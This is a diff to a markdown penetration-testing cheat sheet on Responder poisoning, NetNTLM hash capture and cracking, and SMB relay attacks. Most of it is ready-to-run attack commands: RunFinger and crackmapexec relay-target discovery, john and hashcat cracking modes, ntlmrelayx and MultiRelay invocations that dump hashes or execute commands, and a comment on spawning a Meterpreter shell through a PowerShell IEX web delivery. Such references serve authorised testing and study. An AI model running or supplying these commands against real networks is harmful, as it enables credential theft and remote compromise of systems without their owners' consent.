@@ -82,9 +82,6 @@ Common use: poison responses during NetNTLM authentication to capture credential
 Install:   
 
     git clone https://github.com/lgandx/Responder   
- Recon: RunFinger.py to identify hosts, OS and SMB info. Check if SMB signing is not enabled               
- 
-    /opt/Responder/tools $ python3 RunFinger.py -i 172.16.1.1/24       
  Responder Usage:   
  Config file: edit responder.conf to disable SMB / HTTP servers, change RespondTo arguement to target a specific host     
 
@@ -95,18 +92,27 @@ You might be able to use a LFI vulnerability to request a resource and capture a
 Captured hashes will be stored in the logs folder, in a .txt file named for the protocol hash type and IP captured from.      
 
     username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response   #NTLMv2 Responder capture format       
-Crack Hashes from responder:     
+### Crack Hashes from Responder     
 
     john hashes.txt   #John the Ripper will automatically detect the format of hashes collected by Responder.    
     hashcat -m 5500   #NTLMv1 (hashes captured from using a tool like Responder)     
     hashcat -m 5600   #NTLMv2 (hashes captured from using a tool like Responder)   
 
+### NTLM Relay Attack       
 Use NTLMRelay or MultiRelay to relay the credentials to any SMB server which has SMB signing disabled (can't relay the creds back to the source computer unless you are relaying them to a different service). Windows workstations have SMB signing disabled by default.          
 [byt3bl33d3r Guide to NTLM Relaying](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)    
+Recon: RunFinger.py or Crackmapexec to identify hosts, OS and SMB info. Check if SMB signing is not enabled and you can perform a relay attack:                    
+ 
+    /opt/Responder/tools $ python3 RunFinger.py -i 172.16.1.1/24       
+    crackmapexec smb --gen-relay-list smb_targets.txt 192.168.1.0/24
+
 [NTLMRelay - Impacket Script](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
+You might need to disable the SMB or HTTP servers used by Responder to avoid conflicts.    
 
     sudo python3 ntlmrelayx.py -tf targets -smb2support     
-[MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)      
+    ntlmrelayx.py -socks -smb2support -tf smb_targets.txt     
+[MultiRelay - Built into the Responder Toolkit](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py)     
 
     /opt/Responder/tools $ python3 MultiRelay.py -t 172.16.1.5 -u ALL -d    #Relay auth requests for all users, dump local account hashes   
     /opt/Responder/tools $ python3 MultiRelay.py -t 10.10.10.10 -c "whoami"   #exec a command    
+    #can spawn a Meterpreter shell using exploit/multi/script/web_delivery using a PowerShell IEX command        
